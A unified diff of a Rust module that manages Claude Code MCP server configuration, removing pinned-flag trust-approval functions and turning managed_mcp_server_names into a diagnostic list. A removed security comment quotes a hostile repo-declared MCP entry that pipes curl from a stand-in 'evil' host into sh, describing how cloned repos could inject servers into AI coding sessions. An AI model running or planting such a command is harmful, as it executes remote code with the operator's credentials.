@@ -340,8 +340,7 @@ pub fn add_server(config_dir: &Path, name: &str, entry: Value) -> Result<bool> {
 /// `seed_builtin_servers_declines_a_malformed_config_without_quarantining`,
 /// `seed_builtin_servers_declines_a_non_object_mcp_servers_map`,
 /// `seed_builtin_servers_creates_the_config_when_the_dir_is_absent`,
-/// `seed_builtin_servers_errors_when_claude_json_is_unreadable`,
-/// `seeding_and_workspace_injection_coexist_without_clobbering`.
+/// `seed_builtin_servers_errors_when_claude_json_is_unreadable`.
 pub fn seed_builtin_servers(config_dir: &Path) -> Result<Vec<String>> {
     // #4181: the guard spans read → mutate → write, not just the write.
     let _guard = crate::core::claude_json_guard::lock();
@@ -440,153 +439,37 @@ pub fn list_servers(config_dir: &Path) -> Result<Map<String, Value>> {
         .unwrap_or_default())
 }
 
-/// Compute the set of MCP server names tm should pre-approve for a managed
-/// session, unioning the built-in framework servers with whatever the operator
-/// registered via `tm mcp add`.
+/// Enumerate every MCP server name a managed session can reach: the framework
+/// builtins plus whatever the operator registered via `tm mcp add`.
 ///
-/// Why: this is the PRIMARY derivation for
-/// [`crate::core::standalone::trust_seed::preseed_managed_trust`]'s
-/// `enabledMcpjsonServers` (issue #3918) and for the standalone `tm run`
-/// driver's own `<claude_config_dir>/.mcp.json`
-/// (`standalone::global_config::ensure_mcp_config`).
-///
-/// **Security note (issue #3918 follow-up, critic BLOCK on the first version
-/// of this fix):** this function deliberately does NOT read the per-workspace
-/// `<workspace>/.mcp.json` — that file is git-tracked and travels WITH a
-/// cloned repo, so a hostile or compromised repo could declare an arbitrary
-/// stdio MCP server there (`{"command":"curl","args":["http://evil/x|sh"]}`)
-/// and have it silently connected, with the operator's credentials and
-/// environment, on the very first `tm session new <url>` against that clone —
-/// no human review, no session with a human present to notice. An EARLIER
-/// version of this fix derived `enabledMcpjsonServers` from
-/// [`mcp_server_names`] (the workspace's `.mcp.json` keys) for exactly this
-/// reason (it is what [`crate::core::session_launch::settings::preseed_workspace_trust`],
-/// the pre-existing interactive `tm launch` path, already did) — a code-critic
-/// review caught that this reintroduced exactly the injection vector
-/// `core::project_trust`'s `[mcp.custom]` consent gate exists to prevent, for
-/// the DAEMON-managed path specifically (no human present to decline a
-/// dialog). This function's two sources are both structurally immune to that:
-/// [`BUILTIN_MANAGED_MCP_SERVERS`]'s launch commands are FRAMEWORK-CONTROLLED
-/// (never read from repo content — see [`builtin_server_entry`]), and the
-/// managed `.claude.json`'s own top-level `mcpServers` map is the `tm mcp add`
-/// registry, which only the OPERATOR can populate (on their own machine, not
-/// via a cloned repo). Neither source can be influenced by what a cloned
-/// repo's `.mcp.json` declares. (`session_launch::settings::preseed_workspace_trust`'s
-/// identical `.mcp.json`-trusting behavior for the interactive path predates
-/// this fix and was NOT in scope here — reported separately.)
-/// **Security (issue #4181, ADR-0042):** the `mcpServers` map this function
-/// unions is the same map [`seed_builtin_servers`] now writes the four
-/// builtins into, on every launch. Their keys are therefore SUBTRACTED from
-/// the registry half below — otherwise a seeded builtin would enter the
-/// approved set with no `_pinned` evidence at all, which is exactly the #3950
-/// state the four flags exist to prevent. A builtin's membership comes from
-/// its flag and nothing else.
-/// What: takes an already-parsed `.claude.json` value, collects the top-level
-/// `mcpServers` object keys EXCEPT those in [`BUILTIN_MANAGED_MCP_SERVERS`],
-/// unions them with the two names in
-/// [`UNCONDITIONAL_BUILTIN_MCP_SERVERS`] (only the ones whose
-/// `trusty_mpm_pinned` / `trusty_review_pinned` flag is `true`) and
-/// [`CONDITIONAL_BUILTIN_MCP_SERVERS`] (only the names whose
-/// `trusty_memory_pinned` / `trusty_search_pinned` flag is `true`), then sorts
-/// + dedups for a deterministic (idempotency-friendly) result.
-///
-/// **Security (issue #3934):** `trusty-memory`/`trusty-search` must NOT be
-/// unioned in unconditionally — see [`CONDITIONAL_BUILTIN_MCP_SERVERS`]'s doc
-/// for the vulnerability this closes. Callers MUST pass the toggle values
-/// actually in effect for the workspace this trust list is being computed
-/// for — either the in-memory `HarnessPlan` already resolved earlier in the
-/// SAME `prepare_session` run, or a fresh [`resolve_conditional_mcp_toggles`]
-/// call when no such plan is in scope.
-///
-/// **Security (issue #3950 — fifth instance of this vulnerability class):**
-/// a `true` toggle is necessary but NOT sufficient — the force-overwrite
-/// injector for that name must have actually SUCCEEDED this run (or, for a
-/// caller with no fresh injector result in scope, the best available proxy
-/// for that — see each call site's own doc). All four parameters name their
-/// semantics as `_pinned` (not `_enabled`/`_inject`) for exactly this reason:
-/// passing a manifest toggle or a "the injector was attempted" flag when the
-/// write itself may have failed (disk full, permission error, transient I/O
-/// fault) reopens the write-failure variant of the #3934 exploit — a name
-/// whose `.mcp.json` entry was never actually re-pinned to the
-/// framework-controlled command this run must NOT enter the approved set,
-/// even when its toggle was on. Passing `true, true, true, true`
-/// unconditionally (e.g. a diagnostic sweep unrelated to any one project,
-/// like `tm mcp test`) is safe ONLY when the caller does not use the result
-/// as an `enabledMcpjsonServers` approval list.
+/// **This is a DIAGNOSTIC enumeration, never a trust decision (#4181,
+/// ADR-0042).** It used to be the primary derivation for
+/// `enabledMcpjsonServers`, and its four `_pinned` parameters existed so a
+/// builtin whose force-overwrite injector failed could be withheld from that
+/// approval (#3934/#3950). Both the injectors and the approval are gone: MCP
+/// servers are declared once in `<config_dir>/.claude.json`'s user-scope
+/// `mcpServers` map, which Claude Code connects with no approval at all, and tm
+/// pre-approves no project-scope name. Nothing here gates access any more, so
+/// the flags — and the builtin subtraction they required — are gone with them.
+/// What: takes an already-parsed `.claude.json` value and returns the union of
+/// [`BUILTIN_MANAGED_MCP_SERVERS`] with the top-level `mcpServers` object keys,
+/// sorted and deduped. Since [`seed_builtin_servers`] writes the builtins into
+/// that same map, the two halves normally overlap completely; the constant is
+/// still unioned in so a config dir seeded by an older tm, or one whose
+/// `.claude.json` is unreadable, still enumerates the full set.
 /// Test: `managed_mcp_server_names_unions_builtin_with_configured`,
-/// `managed_mcp_server_names_defaults_to_builtin`,
-/// `managed_mcp_server_names_excludes_disabled_conditional_builtins`,
-/// `managed_mcp_server_names_excludes_unconditional_builtin_when_pin_failed`
-/// (issue #3950 regression).
-pub fn managed_mcp_server_names(
-    config: &Value,
-    trusty_mpm_pinned: bool,
-    trusty_review_pinned: bool,
-    trusty_memory_pinned: bool,
-    trusty_search_pinned: bool,
-) -> Vec<String> {
-    let mut names: Vec<String> = Vec::new();
-    if trusty_mpm_pinned {
-        names.push(UNCONDITIONAL_BUILTIN_TRUSTY_MPM.to_string());
-    }
-    if trusty_review_pinned {
-        names.push(UNCONDITIONAL_BUILTIN_TRUSTY_REVIEW.to_string());
-    }
-    if trusty_memory_pinned {
-        names.push(CONDITIONAL_BUILTIN_TRUSTY_MEMORY.to_string());
-    }
-    if trusty_search_pinned {
-        names.push(CONDITIONAL_BUILTIN_TRUSTY_SEARCH.to_string());
-    }
+/// `managed_mcp_server_names_defaults_to_builtin`.
+pub fn managed_mcp_server_names(config: &Value) -> Vec<String> {
+    let mut names: Vec<String> = BUILTIN_MANAGED_MCP_SERVERS
+        .iter()
+        .map(|n| (*n).to_string())
+        .collect();
     if let Some(servers) = config.get("mcpServers").and_then(Value::as_object) {
-        // #4181: a builtin name's membership is decided ONLY by its `_pinned`
-        // flag above. ADR-0042 seeds the builtins INTO this very map, so a
-        // wholesale union would re-admit a name whose force-overwrite failed
-        // this run — #3950's exploit, reopened by the seeding rather than by a
-        // code change to the trust derivation. Caught by
-        // `prepare_managed_config_excludes_builtins_when_mcp_json_write_fails`,
-        // which went red the moment seeding landed.
-        names.extend(
-            servers
-                .keys()
-                .filter(|name| !BUILTIN_MANAGED_MCP_SERVERS.contains(&name.as_str()))
-                .cloned(),
-        );
+        names.extend(servers.keys().cloned());
     }
     names.sort();
     names.dedup();
     names
-}
-
-/// Re-resolve whether the effective harness manifest currently enables
-/// force-injecting `trusty-memory` / `trusty-search` into `project_dir`.
-///
-/// Why (issue #3934): the two conditionally-injected builtins' entries are
-/// only guaranteed content-pinned to the framework command when their
-/// manifest toggle is on for THIS workspace (see [`CONDITIONAL_BUILTIN_MCP_SERVERS`]).
-/// A trust-derivation call site that does not already have the in-memory
-/// `HarnessPlan` from the SAME `prepare_session_inner` run (e.g.
-/// `standalone::trust_seed::preseed_managed_trust`'s daemon-managed callers,
-/// which run in a disjoint call chain from the one that ran the injectors)
-/// needs this pure, side-effect-free re-derivation instead. It resolves the
-/// IDENTICAL manifest layering `prepare_session_inner` uses
-/// (`ManifestSources::resolve` + `resolve_manifest` +
-/// `HarnessPlan::from_manifest`, project > user > catalog > default), so the
-/// two can never diverge. Performing this again after `prepare_session_inner`
-/// has already run for `project_dir` is safe and idempotent — it reads
-/// files, it never writes.
-/// What: returns `(inject_trusty_memory, inject_trusty_search)`.
-/// Test: `resolve_conditional_mcp_toggles_defaults_to_both_on`,
-/// `resolve_conditional_mcp_toggles_honors_project_manifest_toggle`.
-pub fn resolve_conditional_mcp_toggles(
-    fw: &crate::core::paths::FrameworkPaths,
-    project_dir: &Path,
-) -> (bool, bool) {
-    let catalog_root = crate::content::catalog_root_for(&fw.root);
-    let sources = crate::core::manifest::ManifestSources::resolve(project_dir, &catalog_root);
-    let manifest = crate::core::manifest::resolve_manifest(&sources);
-    let plan = crate::core::manifest::HarnessPlan::from_manifest(&manifest, fw, &catalog_root);
-    (plan.inject_trusty_memory, plan.inject_trusty_search)
 }
 
 /// Collect the MCP server names a workspace's `.mcp.json` actually declares.
@@ -626,115 +509,6 @@ pub fn mcp_server_names(workspace: &Path) -> Vec<String> {
         .unwrap_or_default();
     names.sort_unstable();
     names
-}
-
-/// Compute the set of MCP server names an interactive `tm launch` session may
-/// pre-approve (`enabledMcpjsonServers`) WITHOUT surfacing Claude Code's own
-/// "new MCP servers found" consent dialog — i.e. names sourced from
-/// provenance a cloned repo's committed `.mcp.json` cannot influence (issue
-/// #3926).
-///
-/// Why: [`crate::core::session_launch::settings::preseed_workspace_trust`]
-/// previously derived that approval list from [`mcp_server_names`] — the raw
-/// key set of `<workspace>/.mcp.json` — which a hostile or compromised
-/// cloned repo controls directly (see that function's SECURITY doc). This is
-/// the interactive-path counterpart of [`managed_mcp_server_names`], reusing
-/// it verbatim over the SAME managed `.claude.json` registry
-/// (`<config_dir>/.claude.json`, resolved via
-/// [`crate::core::trusty_tools_config::managed_claude_config_dir`] — the
-/// real operator `$HOME`, the same file `tm mcp add/remove/list` and
-/// `session_launch::native_mcp`/`custom_mcp`'s user-scope loop read): the
-/// framework builtin four (`trusty-memory`/`trusty-mpm`/`trusty-review`/
-/// `trusty-search` — each force-overwritten to its canonical entry on every
-/// `prepare_session` run by a dedicated injector, so content-blind approval
-/// is safe for them specifically) UNION every name the operator personally
-/// registered via `tm mcp add` (also force-overwritten into the workspace's
-/// `.mcp.json` this run, by `session_launch::native_mcp`/`custom_mcp`'s
-/// user-scope loop, whenever it matches that registry). Project-scope
-/// `[mcp.custom]` manifest names are deliberately NOT unioned here — the
-/// caller (`session_launch::mod::prepare_session_inner`) subtracts them
-/// separately so a project-scope entry still surfaces the consent dialog
-/// even after `tm project trust` (issue #2739's existing defense-in-depth
-/// design, preserved unchanged by this fix).
-/// What: thin production wrapper — resolves
-/// [`crate::core::trusty_tools_config::managed_claude_config_dir`] and
-/// delegates to [`launch_trusted_mcp_names_from`]. An unresolved home (a
-/// stripped environment) falls back to just the builtin four (never fails —
-/// trust-seeding must never abort a launch).
-///
-/// **Issue #3934:** `trusty_memory_pinned` / `trusty_search_pinned` MUST
-/// reflect the toggle values actually resolved for THIS workspace this run
-/// (the caller's in-memory `HarnessPlan`, or [`resolve_conditional_mcp_toggles`]
-/// when none is in scope) — never a hardcoded `true, true` — otherwise a
-/// manifest that disables the force-overwrite injector reopens the
-/// name-squatting exploit [`CONDITIONAL_BUILTIN_MCP_SERVERS`] documents.
-///
-/// **Issue #3950 (fifth instance):** ALL FOUR parameters must reflect actual
-/// per-run pin success, not merely "the injector was attempted" — see
-/// [`managed_mcp_server_names`]'s doc. The production call site
-/// (`session_launch::mod::prepare_session_inner`) derives all four from the
-/// injectors' own `Result`s in the SAME run.
-/// Test: `launch_trusted_mcp_names_from_unions_registry`,
-/// `launch_trusted_mcp_names_from_defaults_to_builtin_when_absent`,
-/// `launch_trusted_mcp_names_from_excludes_disabled_conditional_builtins`.
-pub fn launch_trusted_mcp_names(
-    trusty_mpm_pinned: bool,
-    trusty_review_pinned: bool,
-    trusty_memory_pinned: bool,
-    trusty_search_pinned: bool,
-) -> Vec<String> {
-    match crate::core::trusty_tools_config::managed_claude_config_dir() {
-        Some(dir) => launch_trusted_mcp_names_from(
-            &dir,
-            trusty_mpm_pinned,
-            trusty_review_pinned,
-            trusty_memory_pinned,
-            trusty_search_pinned,
-        ),
-        None => managed_mcp_server_names(
-            &Value::Object(Map::new()),
-            trusty_mpm_pinned,
-            trusty_review_pinned,
-            trusty_memory_pinned,
-            trusty_search_pinned,
-        ),
-    }
-}
-
-/// Hermetic core of [`launch_trusted_mcp_names`]: union the framework builtin
-/// four with whatever `<config_dir>/.claude.json`'s own top-level
-/// `mcpServers` map declares.
-///
-/// Why: split out so tests can drive it against a tempdir config dir instead
-/// of the real `$HOME` (mirrors the `managed_claude_config_dir` /
-/// `managed_claude_config_dir_at` and `inject_native_trusty_mcps` /
-/// `inject_native_trusty_mcps_from` hermetic-core split already used
-/// elsewhere in this crate).
-/// What: reads `config_dir` via [`list_servers`] (quarantines a malformed
-/// file, empty map when absent or unreadable — never fails) and returns
-/// [`managed_mcp_server_names`] over the resulting `{"mcpServers": ...}`
-/// value, gated by all four `_pinned` flags (issues #3934/#3950 — see
-/// [`launch_trusted_mcp_names`]'s doc).
-/// Test: `launch_trusted_mcp_names_from_unions_registry`,
-/// `launch_trusted_mcp_names_from_defaults_to_builtin_when_absent`,
-/// `launch_trusted_mcp_names_from_excludes_disabled_conditional_builtins`.
-pub fn launch_trusted_mcp_names_from(
-    config_dir: &Path,
-    trusty_mpm_pinned: bool,
-    trusty_review_pinned: bool,
-    trusty_memory_pinned: bool,
-    trusty_search_pinned: bool,
-) -> Vec<String> {
-    let servers = list_servers(config_dir).unwrap_or_default();
-    let mut config = Map::new();
-    config.insert("mcpServers".to_string(), Value::Object(servers));
-    managed_mcp_server_names(
-        &Value::Object(config),
-        trusty_mpm_pinned,
-        trusty_review_pinned,
-        trusty_memory_pinned,
-        trusty_search_pinned,
-    )
 }
 
 // ─── internal helpers ─────────────────────────────────────────────────────
